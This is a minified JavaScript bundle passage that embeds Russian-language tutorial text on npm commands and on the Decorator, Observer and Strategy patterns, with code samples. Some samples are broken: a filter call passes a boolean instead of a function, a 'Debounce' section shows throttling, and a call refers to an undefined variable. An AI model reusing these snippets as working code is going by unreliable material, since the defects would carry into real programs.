необходимо установить [![ico-70 node]](https://nodejs.org)\n\nДалее заходим в ![ico-25 bash]\n\n___________________________________________________________________________________________________\n\n## ![ico-40 npm] Commands\n\n![ico-20 bash] which npm\n\n![](https://lh6.googleusercontent.com/w65C2Uqbs47V9db_Yn_oR4ui2MUFvFWnl6Yb4riD4zImCTTPUWSLDNXiUD7VuJdl0eQgsK_iLfvTb2kBwLuq64VhDpXYUiTQctg2zbP3Vt-w34LtxtVjY7jHfX4wvY-prbVrtwZBh1UEf5M)\n\n![ico-20 bash] npm --version\n\n![](https://lh6.googleusercontent.com/cP5U5nwO7rgudZfLJCkqvRU9Am4wI7jzAJzz3G0iBG-Rt9pnrV9xpIFqTvcjJk-YgZSYhpe1qOwyqe6YxMdZbKI7HqnczyStJEO2F7Yve01Fcgs2_vio4ExYpaQmGV0TepBGbcvQYIdJ_oM)\n\n\n![ico-20 bash] npm root\n\nПапка для глобальной установки пакетов\n\n![](createPath("illustrations","npm-root.png"))\n\n_____________________________________________________________________________________________\n\n### ![ico-40 npm] npm init\n\nЭта команда создаст файл [**~package.json~**](https://docs.npmjs.com/files/package.json) в текущей папке\n^^Предварительно нужно создать новую папку для проекта и перейти в нее^^\n\n![ico-20 warn] **~package.json~** хранит зависимости проекта, т.е. список пакетов, необходимых для проекта\n^^( для каждого пакета указана нужная версия )^^\n\n^^При создании файла **~package.json~** **npm** задаст ряд вопросов о проекте,^^\n^^который будет расположен в текущей папке^^\n\n^^Ваши ответы будут использованы для установки значений полей:^^\n\n|•| **~name~**        | ^^название проекта^^ |\n|•| **~version~**     | ^^версия^^ |\n|•| **~description~** | ^^краткое описание^^ |\n|•| **~author~**      | ^^автор ( вы )^^ |\n|•| **~repository~**  | ^^ссылка на репозиторий проекта^^ |\n|•| **~keywords~**    | ^^ключевые слова^^ |\n|•| **~scripts~**     | ^^объект, описывающий команды запуска скриптов с помощью **~npm run~**^^ |\n\n^^^[npm init]\n\n![](https://lh4.googleusercontent.com/ZfltZTmbCAsgDdV4IMmNt92vXLdwU5pLyl446vLzdZ5bfuOVx_GIGW-WP2TtxVLriNWUrhkAn2JnNdmYEUszIiQKNkIsGKiuJEfW4t9c3L2-HnhTYjmTaQwW6vmDb1snqoyQ6w0IcjsvR9E)\n\n^^^\n\n^^Поскольку в дальнейшем вы сможете редактировать файл **~package.json~**,^^\n^^можно особо не заморачиваться первоначальными установками^^ ![ico-20 wink]\n\n_________________________________________________________________________________________________\n\n### ![ico-40 npm] package.json\n\nТеперь при установке любого пакета запись об этом пакете будет автоматически добавляться в  раздел **_~dependencies~_** \nфайла **~package.json~**\n\nВсе пакеты, которые необходимы для проекта, будут описаны в разделах \n\n| ![ico-20 folder] | **~dependencies~**    | ^^**зависимости пакета**<br>эти пакеты будут непосредственно включены в сборку приложения^^ |\n| ![ico-20 folder] | **~devDependencies~** | ^^**пакеты, необходимые на этапе сборки**<br>в само приложение не встраиваются^^ |\n\n____________________________________________________________________________________________\n\n### ![ico-40 npm] .npmrc\n\nФайл конфигурации, откуда ( наряду с ~package.json~ ) npm  будет считывать установки\n\n^^Файл  .npmrc  может существовать для каждого проекта,^^\n^^для каждого пользователя,^^\n^^и глобально^^\n\nПосмотреть настройки конфигурации по умолчанию можно с помощью команды\n\n••![ico-20 bash] npm config ls -l••\n\nИзменить настройки можно с помощью команды\n\n••![ico-20 bash] npm config••\n\nНапример, для автоматического сохранения зависимостей:\n\n••![ico-20 bash] npm config set save=true••\n\nа для сохранения зависимостей с указанием точной версии пакета:\n\n••![ico-20 bash] npm config set save-exact=true••\n\n___________________________________________________________________________________\n\n### ![ico-40 npm] npm install\n\nВ своих проектах вы будете использовать различные пакеты, облегчающие жизнь ![ico-20 wink]\n\n^^Часть этих пакетов нужна будет для сборки вашего приложения,^^\n^^его тестирования, отладки, транспилляции и т.д.^^\n^^Эти пакеты не будут включаться в тело приложения^^\n^^Они помогут это тело постоить^^\n\n^^Однако в самом приложении вы будете использовать сторонние библиотеки, фреймворки и т.д.^^\n^^Эти пакеты будут включены в сборку вашего приложения^^\n\n^^Короче, все эти пакеты нужно установить^^\n\n^^Для этого вам понадобится команда **~npm install~**^^\n\n___________________________________________________________________________\n\n![ico-20 npm] Опция  **~-g~**  позволяет установить пакет **глобально**, чтобы он был доступен всем вашим приложениям\n\n^^![ico-20 pin] **Глобальная установка пакета** с именем &lt;имя пакета>:^^\n\n••![ico-20 bash] npm install -g &lt;имя пакета>••\n\n^^![ico-20 pin] **Локальная установка пакета** с именем &lt;имя пакета>:^^\n\n••![ico-20 bash] npm install &lt;имя пакета>••\n\n![ico-20 speach] ^^_Локальная_ - значит, пакет будет установлен в той директории ( папке пректа ), в которой вы находитесь в момент вызова  **~npm~**^^\n\n_____________________________________________________________________________________\n\n![ico-20 npm] При установке пакетов с опцией _~--save~_   или _~--save-dev~_ \n\n**~npm~**   будет добавлять соответствующие записи в раздел ![ico-20 dir] **~dependencies~**  или  ![ico-20 dir] **~devDependencies~**\n\n![ico-20 cap] Например, команда\n\n••![ico-20 bash] npm install  -g  css-loader  --save-dev••\n\n^^установит загрузчик  **~css-loader~**   глобально^^\n^^и внесет соответствующую запись в **_~devDependencies~_**^^\n\n_____________________________________________________________________\n\n### ![ico-30 folder] node_modules\n\nВсе установленные локально пакеты будут находиться в папке ![ico-20 dir] **~node_modules~**  текущего проекта\n\n![ico-20 warn] Папку **~node_modules~** необходимо всегда добавлять в **~gitignore~**\n\n![ico-30 git] gitignore\n\n![](https://lh6.googleusercontent.com/SLXHR8Om5imjD3M9PUDQeB8WmOoBDYBYZYGxJC1IhdUji_AxJca4r_c9sxL1nK7Ly-naC8DX9vKDaf03a3w2E3zYUxnXeatwEfu8oe0jlGOlfqkO0Fftlrb8JJFoA-odZqTAzbuur3SD_ZQ)\n\n^^В git-репозитории никто никогда не хранит папку ![ico-20 dir] **~node_modules~**,^^\n^^однако если клонировать репо,^^\n^^то установить все необходимые пакеты при наличии файла **~package.json~**  очень легко^^\n\n^^достаточно выполнить консольную команду ![ico-20 bash] ~npm install~,^^\n^^и все пакеты, перечисленные в package.json, будут установлены^^\n^^в соответствии с указанными версиями^^\n\n_______________________________________________________________________________________________________\n\n### ![ico-40 npm] npm run\n\nПрежде, чем использовать эту команду, нужно внести определенные изменения в файл **~package.json~**\n\nКонкретнее - в раздел **_~scripts~_**:\n\n~~~js\n"scripts": {\n    "алиас" : "путь_к_файлу_скрипта"\n    ...\n}\n~~~\n\nВ этом разделе мы описываем скрипты или пакеты, которые будем запускать с помощью команды  ~npm run~\n\nЭта команда запускает указанный скрипт\n\n~~~js\n"scripts": {\n    "start" : "node index.js",\n    "build" : "webpack"\n}\n~~~\n\n_______________________________________________________________________________________\n\n### ![ico-40 npm] npm list\n\n**Вывод списка установленных пакетов**\n\nДля вывода списка пакетов, установленных глобально, используйте опцию **~-g~**\n\n••![ico-20 bash] npm list -g••\n\n![](https://lh6.googleusercontent.com/MCZpi5JBh9OCJmvpvl139V_WNTvFRlhf_qoDsLRh4eETCYDngtEeiuLxiipbaiqfs-zizH5SVgUbKgOpvXMNkoA-88_9TdjKSbp7qBIAb5Px51_x_Z89MpuhJU0UcSvt-Vg-04nHlz2c6s8)\n\n••![ico-20 bash] npm list --depth=0••\n\nДля вывода краткого списка ( без подробностей о каждом пакете ) используется опция **~--depth=0~**\n\n![](http://icecream.me/uploads/ca3c97a33ec377e15452bfcc82615ab9.png)\n\n__________________________________________________________________________________________________\n\n### ![ico-40 npm] npm search\n\n**поиск пакетов**\n\n••![ico-20 bash] npm search babel••\n\n![](https://lh4.googleusercontent.com/oo2pdarDWkeQdqJVNbF8-LI4Z0Ki6DpzQsNyaRdY7zsjKByhVHDNw2t9v2RoUNw1HAUhj6YhlUAX3kYfemfira5X2Zgmp2MYIX0SJXAI0Iviv4LJRUl3DLCoJFirCr9lh3TcnQBEs1sQkRU)\n\n____________________________________________________________________________\n\n### ![ico-40 npm] npm link\n\n**Создание символических ссылок**\n\nКогда вы запускаете ~npm link~ в корневой папке проекта, **~npm~** создает символическую ссылку из вашего каталога **_~global node_modules~_** в папку проекта\n\n**~global node_modules~** представляет собой специальную папку, в которой хранятся все глобально установленные модули\n\n••![ico-20 bash] npm install -g••\n\nВы можете найти путь к вашему глобальному каталогу ~node_modules~, запустив \n\n••![ico-20 bash] npm root -g••\n\n^^^[Пример 1]\n\nсоздание символической ссылки в глобальной папке ( ** ~** ) на пакет в локальной папке\n\nПерейдем в папку ~z/home/test/node_modules~ и создадим символическую ссылку на пакет **~express~** в текущей папке\n\n![](http://icecream.me/uploads/c822230d4ea7d8c23989faa08b7e0533.png)\n\n^^^\n\n^^^[Пример 2]\n\nТеперь перейдем в папку другого проекта ( _~/z/home/js-samples~_ )\nи создадим там символическую ссылку на пакет **_express_**,\nустановленный в папке ( _~/z/home/test/node_modules~_ ),\nна который есть символическая ссылка из глобальной папки ( ** ~** )\n\n![](http://icecream.me/uploads/68f176dd4c7535aeb9d3e1fbedfd9830.png)\n\n^^^\n\n![ico-20 warn] Команда **~link~** предназначена для создания символических ссылок только на пакеты\n\nДля отмены установленной связи используем команду:\n\n••![ico-20 bash] npm unlink images••\n••![ico-20 bash] ls -al $(npm root -g)••\n\n____________________________________________________________________________________\n\n## ![ico-40 npm] package-lock.json\n\nКаждый раз при установке новой зависимости npm автоматически обновляет lock-файл с именем **_~package-lock.json~_**\n\n**_~package-lock.json~_** - это "слепок" текущего дерева зависимостей, который точно описывает дерево папок в директории ~node_modules~\n\n![warn-25] **_~package-lock.json~_** никогда не будет опубликован, даже если его явно включить в сборку\n\n**_~package-lock.json~_** включает поле **_integrity_** для проверки целостности пакета\n\n^^Указание конкретной версии пакета в **_~package.json~_** фиксирует зависимости только верхнего уровня^^\n\n^^Если ваше приложение будет запущено на другой машине ( пользователя ), то могут быть установлены другие версии пакетов более глубокого уровня, что может "сломать" работу приложения^^\n\n^^Для того, чтобы у конечного пользователя вашего приложения всегда воспроизводилось дерево зависимостей, идентичное вашему на момент публикации, следует использовать **_~shrinkwrap~_** для создания точного слепка этих зависимостей и публикации этого слепка вместе с приложением^^\n\n![](http://icecream.me/uploads/e5b85cfcb24ca4d34562e1e2ae37ae54.png)\n\n____________________________________________________________________________________________________________________\n\n## ![ico-40 npm] npm shrinkwrap\n\nКаждый раз, когда выполняется развертывание ( _deploy_ ) приложения, Node.js запускает **_npm_**\n\n^^Развертывание может существенно затянуться за счет установки новых версий пакетов, указанных в списке зависимостей вашего приложения^^\n\n^^Избежать обновления зависимостей можно путем создания файла **_npm-shrinkwrap.json_**, который фиксирует текущие версии зависимостей вашего приложения^^\n\n^^Формат этого файла полностью идентичен формату **_~package-lock.json~_**^^\n\n![warn-25] **_~npm-shrinkwrap.json~_** может быть частью опубликованного пакета\n\nЕсли выполнить команду **~npm shrinkwrap~** в папке, в которой уже есть **_~package-lock.json~_**,\n\n**npm** переименует **_~package-lock.json~_** в **_~npm-shrinkwrap.json~_**\n\nЕсли в папке проекта будут оба файла, **npm** будет использовать **_~npm-shrinkwrap.json~_** и игнорировать **_~package-lock.json~_**\n\n[![ico-20 link] npm shrinkwrap](https://javascript.tutorialhorizon.com/2015/03/21/what-is-npm-shrinkwrap-and-when-is-it-needed/)\n'},42738:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] Design Patterns\n\n_____________________________________\n\n## ![ico-20 icon] Decorator\n\nПаттерн \"Декоратор\" позволяет добавить специфические \"черты\" целевому объекту\n\nПримером реализации паттерна Decorator является метод **bind**\n\n_____________________________________\n\nПредположим, мы хотим управлять вызовами некоторых функций\n\n### ![ico-20 icon] Одиночный вызов\n\nДекоратор, обеспечивающий одноразовое использование функции\n( повторные вызовы будут игнорироваться )\n\n◘◘![ico-20 cap] ** 1**◘◘\n\n~~~js\nfunction sayHello (name = 'user') {\n  alert('Hello, ' + name + '!')\n}\n\nconst decoratorOnce = function (func) {\n  let counter = 0\n  return function () {\n    return counter++ === 0 ? func.call(null, ...arguments) : null\n  }\n}\n\n\nconst sayHelloOnce = decoratorOnce(sayHello)\n\nsayHelloOnce('Sasha')\nsayHelloOnce('Mary')\n~~~\n\nВ следующем примере мы применим ту же функцию-декоратор,\nно уже к другой функции, вычисляющей сумму двух аргументов:\n\n◘◘![ico-20 cap] ** 2**◘◘\n\n~~~js\nfunction calcSum ( x, y ) {\n  return Math.round((x + y) * 10) / 10\n}\n\nconst calcSumOnce = decoratorOnce(calcSum)\n\ncalcSumOnce(0.1, 0.2)\n~~~\n\n__________________________________________\n\n### ![ico-20 icon] Debounce\n\n◘◘![ico-20 cap] ** 3**◘◘\n\n~~~js\nfunction showTime () {\n  console.log(new Date().getTime())\n}\n\ndocument.body.onclick = event => showTime()\n~~~\n\nА теперь объявим функцию-декоратор **decoratorThrottling**,\nкоторая \"снабжает\" переданную ей функцию\nспособностью контролировать частоту вызовов\nпутем определения временного интервала\nс момента последнего вызова\n\n~~~js\ndecoratorThrottling = function (func, interval) {\n  let lastCall = new Date().getTime()\n\n  return function () {\n    if (new Date().getTime() - lastCall < interval) return null\n    lastCall = new Date().getTime()\n    return func.call(null, ...arguments)\n  }\n}\n~~~\n\n...и \"декорируем\" функцию **showTime**\n\n~~~js\ndecoratedShowTime = decoratorThrottling(showTime, 2000)\n\ndocument.body.onclick = event => decoratedShowTime()\n~~~\n"},46641:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] Design Patterns\n\n_____________________________________\n\n## ![ico-25 icon] Pattern Observer\n\nЭто **поведенческий** паттерн.\n\nРазберем конкретную ситуацию, в которой его можно применить.\n\nЕсть данные, которые динамически обновляются.\n\nДанные должны отображаться пользователю.\n\nНужно обеспечить реактивность приложения, т.е. отображение должно оперативно обновляться при обновлении данных модели.\n\nПри этом модули должны быть независимы.\n\nКак оповестить модуль, отвечающий за представление данных пользователю, об изменении данных модели?\n\n_______________________________\n\n## ![ico-30 cap] Example 1\n\nПусть есть массив идентификаторов для элементов:\n\n~~~js\nconst inputs = ['author', 'topic', 'message']\n~~~\n\nОбъявим вспомогательную функцию, создающую и вставляющую элемент на страницу:\n\n~~~js\nconst addElem = (tag = 'input', container = document.body) => (container.nodeType === 1 ? container : document.body)\n  .appendChild(document.createElement(tag))\n~~~\n\n## ![ico-25 cap] observed\n\nСоздадим массив элементов _~input~_:\n\n~~~js\nconst observed = inputs  \n  .map(item => {\n    const elem = Object.assign(addElem(), {\n      id: item,\n      innerText: item,\n      placeholder: item\n    })\n    return elem\n  })\n~~~\n\nИтак, пользователь может в любой момент изменить данные модели.\n\n_________________________________________________________\n\n### ![ico-25 cap] createSubscriber\n\nОбъявим функцию **~createSubscriber~**:\n\n~~~js\nfunction createSubscriber (prop, tagName, container = section) {\n  const elem = addElem(tagName)\n  return function update (data) {\n    data[prop] && Object.assign(elem, {\n      innerText: data[prop]\n    })\n  }\n}\n~~~\n\n___________________________________________\n\n### ![ico-25 cap] Class Observer\n\nи, наконец, класс **~Observer~**:\n\n~~~js\nclass Observer {\n  constructor (subjects) {\n    Object.assign(this, {\n      subscribers: [],\n      events: subjects.map(function (elem) {\n        elem.oninput = function (event) {\n          this.broadcast({ [elem.id]: event.target.value })\n        }.bind(this)\n        return elem.oninput\n      }, this)\n    })\n  }\n\n  subscribe (client) {\n    typeof client === 'function'\n      ? this.subscribers.push(client)\n      : console.error('Invalide subscriber: ' + client)\n  }\n\n  unsubscribe (client) {\n    this.subscribers = this.subscribers.filter(subscriber !== client)\n  }\n\n  broadcast (data) {\n    this.subscribers.forEach(client => client(data))\n  }\n}\n~~~\n\nКонструктору класса **~Observer~** передается массив **_~subjects~_**.\n\nЭто массив ссылок на элементы _~input~_, которые обозреватель будет отслеживать.\n\nПри изменении значений элементов обозреватель должен оповестить всех подписчиков об обновлении данных и передать им обновленные данные.\n\n**Подписчики** - это функции, которые нужно будет вызвать при изменении данных модели.\nСсылки на них будут храниться в массиве **_~subscribers~_**.\n\n• Для того, чтобы подписаться на уведомления обозревателя, нужно вызвать его метод **_~subscibe~_**.\n• Для того, чтобы отписаться от уведомлений обозревателя, нужно вызвать его метод **_~unsubscibe~_**.\n• Для оповещения подписчиков есть метод **_~broadcast~_**.\n\n### ![ico-25 cap] Observer instance\n\nОсталось только создать экземпляр обозревателя **~observer~**, передав ему ссылки на отслеживаемые элементы **_~observed~_**:\n\n~~~js\nconst observer = new Observer(observed)\n~~~\n\nи подписчиков, которых **~observer~** будет оповещать об изменении данных:\n\n~~~js\nobserver.subscribe(createSubscriber('topic', 'h3')),\nobserver.subscribe(createSubscriber('message', 'p')),\nobserver.subscribe(createSubscriber('author', 'small'))\n~~~\n\nТееперь при изменении значений в полях _~input~_ созданные подписчики будут реактивно обновляться.\n\n_____________________________________\n\nЕсли \"подписать\" на обновления данных модели метод console.log:\n\n~~~js\nobserver.subscribe(outputDevice.write)\n~~~\n\nто изменения будут отображаться не только на странице, но и в консоли.\n\nВ результате попытки создать подписчика без передачи аргумента:\n\n~~~js\nobserver.subscibe(null)\n~~~\n\nмы получим сообщение от обозревателя:\n\n••Invalide subscriber••\n\n_________________________________________\n\n### ![ico-25 slider-button] Demo 1\n\n{{{pattern-observer.js}}}\n____________________________________________________\n\n### ![ico-25 icon] Full code snippet\n\n~~~~js\nconst inputs = ['topic', 'message', 'author']\n\nconst addElem = (tag = 'input', container = section) => (container.nodeType === 1 ? container : section)\n  .appendChild(document.createElement(tag))\n\nObject.assign(addElem('style'), {\n  textContent: `\n    input {\n      display: block;\n      padding: 4px 12px;\n      margin-left: 16px;\n    }\n  `\n})\n\nconst observed = inputs  \n  .map(item => {\n    const elem = Object.assign(addElem(), {\n      id: item,\n      innerText: item,\n      placeholder: item\n    })\n    return elem\n  })\n\nfunction createSubscriber (prop, tagName, container = section) {\n  const elem = container.appendChild(document.createElement(tagName))\n  return function update (data) {\n    data[prop] && Object.assign(elem, {\n      innerText: data[prop]\n    })\n  }\n}\n\nclass Observer {\n  constructor (subjects) {\n    Object.assign(this, {\n      subscribers: [],\n      events: subjects.map(function (elem) {\n        elem.oninput = function (event) {\n          this.broadcast({ [elem.id]: event.target.value })\n        }.bind(this)\n        return elem.oninput\n      }, this)\n    })\n  }\n\n  subscribe (client) {\n    typeof client === 'function'\n      ? this.subscribers.push(client)\n      : console.error('Invalide subscriber: ' + client)\n  }\n\n  unsubscribe (client) {\n    this.subscribers = this.subscribers.filter(subscriber !== client)\n  }\n\n  broadcast (data) {\n    this.subscribers.forEach(client => client(data))\n  }\n}\n\nconst observer = new Observer(observed)\n\nobserver.subscribe(createSubscriber('topic', 'h3')),\nobserver.subscribe(createSubscriber('message', 'p')),\nobserver.subscribe(createSubscriber('author', 'small'))\n~~~~\n\n____________________________________________________\n\n## ![ico-30 cap] Example 2\n\nИзменим постановку задачи.\nИнициатором изменения значений данных модели не всегда является пользователь.\nТ.е. в нашем распоряжении не будет элементов форм с таким удобным свойством ~onchange~.\n\nПредположим, что нужно отслеживать изменение значений элементов массива ~observed~:\n\n~~~js\nconst observed = ['topic', 'message', 'author']\n~~~\n\nФункцию **~createSubscriber~** можно позаимствовать из предыдущего примера, а вот класс **~Observer~** несколько изменится.\n\n### ![ico-25 cap] Class Observer\n\n~~~js\nclass Observer {\n  constructor (subjects) {\n    Object.assign(this, {\n      subjects: {\n        oldValues: JSON.parse(JSON.stringify(subjects)),\n        newValues: subjects\n      },\n      subscribers: []\n    })\n\n    this.check()\n  }\n\n  check () {\n    const modified = this.subjects.newValues.filter((item, index) => item !== this.subjects.oldValues[index])\n    if (modified.length) {\n      this.subjects.oldValues = JSON.parse(JSON.stringify(this.subjects.newValues))\n      this.broadcast(this.subjects.newValues)\n    }\n    requestAnimationFrame(this.check.bind(this))\n  }\n\n  subscribe (client) {\n    typeof client === 'function'\n      ? this.subscribers.push(client)\n      : console.error('Invalide subscriber: ' + client)\n    this.broadcast(this.subjects.newValues)\n  }\n\n  unsubscribe (client) {\n    this.subscribers = this.subscribers.filter(subscriber !== client)\n  }\n\n  broadcast (data) {\n    this.subscribers.forEach(client => client(data))\n  }\n}\n\nconst observer = new Observer(observed)\n~~~\n\nКак видите, каждый \"подписчик\" отслеживает отдельный элемент массива.\nПри создании подписчика мы передаем ему индекс отслеживаемого элемента:\n\n~~~js\nobserver.subscribe(createSubscriber(0, 'h3')),\nobserver.subscribe(createSubscriber(1, 'p')),\nobserver.subscribe(createSubscriber(2, 'small'))\n~~~\n\nПри регистрации нового подписчика ему передается текщее значение отслеживаемого элемента массива.\nСделаем так, чтобы через некоторое время значения элементов отслеживаемого массива изменились:\n\n~~~js\nconst getRandom = num => Math.max(Math.round(Math.random() * num), 1000)\n\nsetTimeout(() => { observed[0] = 'new topic' }, getRandom(5000))\nsetTimeout(() => { observed[1] = 'new message' }, getRandom(7000))\nsetTimeout(() => { observed[2] = 'new author' }, getRandom(8000))\n~~~\n\nи посмотрим, как работает наше решение.\n\n### ![ico-25 slider-button] Demo 2\n\n{{{pattern-observer-1.js}}}\n"},67294:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] Design Patterns\n\n_____________________________________\n\n### ![ico-20 icon] Strategy\n\nЭто **поведенческий** паттерн.\n\nОн позволяет описать несколько стратегий поведения объекта с возможностью выбора нужной стратегии.\n\n_______________________________\n\nДля начала создадим несколько вспомогательных модулей, которые можно потом импортировать в главный модуль класса.\n\n^^^[helpers/validStrategyNames.js]\n~~~js\nexport const validStrategyNames = [\n  'sum-of-all-numeric-fields',\n  'array-field-length',\n  'key'\n]\n~~~\n^^^\n\nСоздадим вспомогательные функции ~strategyError~, ~dataError~, ~keyError~, ~keyPropError~, ~arrayFieldError~:\n\n^^^[helpers/strategyError.js]\n~~~js\nexport function strategyError () {\n  const stack = `\n    Valid strategy names:<br>\n      • sum-of-all-numeric-fields<br>\n      • array-field-length<br>\n      • key (key name should be third argument.)\n  `\n  throw Object.assign(new Error('Invalid strategy.'), {\n    name: 'Invalid strategy.',\n    message: 'First argument should be the name of strategy.',\n    stack\n  })\n}\n~~~\n^^^\n\n^^^[helpers/dataError.js]\n~~~js\nexport function dataError () {\n  throw Object.assign(new Error('Sorting error'), {\n    name: 'Source data error.',\n    message: 'Invalid source data.',\n    stack: 'Source data should be the array of objects.'\n  })\n}\n~~~\n^^^\n\n^^^[helpers/keyError.js]\n~~~js\nexport function keyError () {\n  throw Object.assign(new Error('Sorting error'), {\n    name: 'Sorting key error.',\n    message: 'Empty key field.',\n    stack: 'Third argument should be the name of key field.'\n  })\n}\n~~~\n^^^\n\n^^^[helpers/keyPropError.js]\n~~~js\nexport function keyPropError (key) {\n  throw Object.assign(new Error('Sorting error'), {\n    name: 'Sorting error.',\n    message: `Invalid key ${key}.`,\n    stack: `There is no prop  in source data.`\n  })\n}\n~~~\n^^^\n\n^^^[helpers/arrayFieldError.js]\n\n~~~js\nexport function arrayFieldError (key) {\n  throw Object.assign(new Error('Sorting error'), {\n    name: 'Sorting error.',\n    message: `Invalid key ${key}.`,\n    stack: `There is no prop  in source data.`\n  })\n}\n~~~\n^^^\n____________________________________\n\n^^^[helpers/testStrategy.js]\n~~~js\nimport { validStrategyNames } from './validStrategyNames'\nimport { strategyError } from './strategyError'\nimport { dataError } from './dataError'\nimport { keyError } from './keyError'\nimport { keyPropError } from './keyPropError'\nimport { arrayFieldError } from './arrayFieldError'\n\nexport function testStrategy (strategyName, data, key) {\n  if (!validStrategyNames.includes(strategyName)) return strategyError()\n\n  if (!Array.isArray(data)) return dataError()\n\n  if (strategyName === 'key' && !key) return keyError()\n\n  if (strategyName === 'key' && !data.filter(record => record[key]).length) {\n    return keyPropError(key)\n  }\n\n  if (strategyName === 'array-field-length') {\n    const err = data\n      .filter(record => Object.keys(record).filter(key => Array.isArray(record[key]).length))\n      .length\n\n    if (err) arrayFieldError()\n  }\n}\n~~~\n^^^\n____________________________________\n\nСоздадим класс **SortStrategy**.\nЭкземпляр этого класса будет сортировать полученный массив объектов в соответствии с указанной стратегией.\nВ данном примере экземпляр может использовать три стратегии сортировки:\n\n| **key** | сортировка по заданному ключу.<br>^^Каждый элемент массива (объект) должен иметь свойство с соответствующим названием.^^ |\n| **sum-of-all-numeric-fields** | сортировка по сумме всех числовых свойств объекта.<br>^^Все числовые свойства объекта, являющегося элементом исходного (сортируемого) массива, будут суммироваться.<br>Сортировка исходного массива будет выполняться по сумме числовых свойств объектов.^^ |\n| **array-field-length** | сортировка по длине свойства-массива.<br>^^Все объекты, являющиеся элементами исходного (сортируемого) массива, должны иметь свойство-массив.<br>Сортировка исходного массива будет выполняться по длине массива-свойства.^^ |\n\nПереключение с одной стратегии на другую происходит за счет изменения свойства **valueOf** каждого элемента исходного массива.\n\n^^^[class SortStrategy]\n~~~js\nimport { testStrategy } from './helpers/testStrategy'\n\nclass SortStrategy  {\n  constructor () {\n    Object.assign(this, {\n      strategy: null,\n      testStrategy\n    })\n  }\n\n  sort (algorithm, data, key) {\n    this.testStrategy(algorithm, data, key)\n\n    this[algorithm](data)\n\n    data.forEach((record, index, arr) => {\n      let current = index, prev = index\n      while (--prev >= 0) {\n        if (arr[current] + 0 < arr[prev] + 0) {\n          ;[arr[prev], arr[current]] = [arr[current], arr[prev]]\n          current = prev\n        }\n      }\n    })\n  }\n\n  'sum-of-all-numeric-fields' (arrayOfObjects) {\n    return arrayOfObjects\n      .map(item => item.valueOf = function () {\n         return Object.keys(this)\n           .reduce((res, prop) => res += Number(this[prop]) || 0, 0)\n      })\n  }\n\n  'array-field-length' (arrayOfObjects) {\n    return arrayOfObjects\n      .map(item => item.valueOf = function () {\n        const propName = Object.keys(this)\n          .find(prop => Array.isArray(this[prop]))\n        return this[propName].length\n      })\n  }\n\n  'key' (arrayOfObjects, keyField) {\n    return arrayOfObjects\n      .map((item, index, array) => Object.assign(array[index], {\n        valueOf () { return this[keyField] }\n      }))\n  }\n}\n~~~\n^^^\n\nТеперь займемся исходными данными. Будем использовать три массива объектов с различным набором свойств.\n\n^^^[salary]\n~~~js\nconst salary = [\n  { name: 'Stephan', jan: 5000, fab: 5200, mar: 5800, apr: 4950, may: 4700, jun: 5100, jul: 5300, aug: 5000, sep: 4900, nov: 4800, dec: 5500 },\n  { name: 'Georg', jan: 2000, fab: 2200, mar: 2500, apr: 2550, may: 2400, jun: 2800, jul: 2100, aug: 2000, sep: 2200, nov: 2450, dec: 2700 },\n  { name: 'Mary', jan: 3100, fab: 3200, mar: 3000, apr: 3400, may: 3000, jun: 3300, jul: 3400, aug: 3700, sep: 3800, nov: 3700, dec: 3900 },\n  { name: 'Piter', jan: 2000, fab: 2250, mar: 1800, apr: 1950, may: 2100, jun: 2100, jul: 2700, aug: 2500, sep: 2900, nov: 2800, dec: 4000 },\n  { name: 'Helen', jan: 2000, fab: 2100, mar: 1700, apr: 1900, may: 2000, jun: 2000, jul: 2500, aug: 2000, sep: 2400, nov: 2700, dec: 3500 },\n  { name: 'Michael', jan: 3000, fab: 3200, mar: 2800, apr: 2950, may: 2700, jun: 3100, jul: 3300, aug: 4000, sep: 3900, nov: 3800, dec: 4500 },\n  { name: 'Andry', jan: 2800, fab: 2700, mar: 2800, apr: 2750, may: 2700, jun: 2500, jul: 2800, aug: 2700, sep: 2700, nov: 2800, dec: 3000 }\n]\n~~~\n^^^\n\n^^^[workers]\n~~~js\nconst workers = [\n  { name: 'Stephan', payments: [5000, 5200, 5800, 4950, 4700, 5100, 5300, 5000, 4900, 4800, 5500] },\n  { name: 'Georg', payments: [2000, 2200, 2500, 2550, 2400, 2800, 2100, 2000, 2200] },\n  { name: 'Mary', payments: [900, 700, 1000, 1200, 200, 400, 250] },\n  { name: 'Piter', payments: [1000, 2050, 1800, 700, 300, 500] },\n  { name: 'Helen', payments: [200, 210, 170, 190, 200] },\n  { name: 'Michael', payments: [3000, 3200, 2800, 2950] },\n  { name: 'Andry', payments: [1000, 1000, 900, 950] }\n]\n~~~\n^^^\n\n^^^[users]\n~~~js\nconst users = [\n  { name: 'Stephan', age: 30, works: 7, children: 2 },\n  { name: 'Georg', age: 25, works: 2, children: 1 },\n  { name: 'Mary', age: 34, works: 10, children: 1 },\n  { name: 'Piter', age: 50, works: 25, children: 3 },\n  { name: 'Helen', age: 40, works: 20, children: 3 },\n  { name: 'Michael', age: 38, works: 16, children: 2 },\n  { name: 'Andry', age: 45, works: 20, children: 2 }\n]\n~~~\n^^^\n\nОсталось создать экземпляр класса **SortStrategy**:\n~~~js\nconst sortStrategy = new SortStrategy\n~~~\n\nи проверить, как он работает.\n\n~~~js\nfunction sort (algorithm, data, key) {\n  try {\n    sortStrategy.sort(algorithm, data, key)\n    console.log(data)\n  } catch (error) {\n    console.warn(error)\n  }\n}\n\nsort('sum-of-all-numeric-fields', salary)\nsort('key', users, 'name')\nsort('array-field-length', worker)\n~~~\n\n{{{pattern-strategy.js}}}\n"},48869:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] Design Patterns\n\nЕсли нужен велосипед, не нужно его изобретать\n\nПаттерны проектирования - это готовые конструкции \"велосипедов\" для различных ситуаций\n\nВ разработке часто встречаются одни и те же проблемы, и многие такие проблемы имеют уже готовый шаблон решения, поскольку многим уже пришлось сталкиваться с аналогичной проблемой до вас\n\nДля создания паттерна проблему нужно формализовать, т.е. описать формальным языком суть проблемы\n\nСледующий шаг - описание принципа решения этой проблемы\n\n________________________________________\n\n@@@@\n\n![](https://img.artlebedev.ru/everything/izdal/yazyk-shablonov/yazyk-shablonov-cover.jpg)\nПервым, кто описал концепцию паттернов, был Кристофер Александер\nПрименительно к сфере разработки программного обеспечения эту концепцию \"адаптировали\" Эрих Гамм, Ричард Хелм, Ральф 